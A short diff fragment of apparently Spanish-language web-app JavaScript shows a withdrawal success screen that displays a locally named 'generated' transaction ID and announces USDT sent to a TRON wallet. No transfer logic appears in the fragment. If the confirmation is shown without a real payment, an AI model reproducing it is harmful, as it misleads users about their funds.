+          const recipientEl = document.getElementById('successRecipientWallet');
+          if (recipientEl) recipientEl.textContent = recipientAddr;
+
+          const txIdEl = document.getElementById('generatedTxId');
+          if (txIdEl) txIdEl.textContent = retiroTxId;
+
+          // Mostrar pantalla de éxito instantáneo
+          scanningState.style.display = 'none';
+          successState.style.display = 'block';
+          document.getElementById('successUsdtResult').textContent = `${usdtToSend} USDT`;
+          document.getElementById('successNewBalance').textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
+          topNavDiamonds.textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
+          lblMaxAvailable.textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
+
+          showToast('¡Retiro Acreditado!', `Se han transferido ${usdtToSend} USDT a tu billetera TRON.`);
+        }
+      }, 100);
         lblMaxAvailable.textContent = `${userState.balance.toLocaleString('en-US')} 💎`;
       }, 3000);
     });
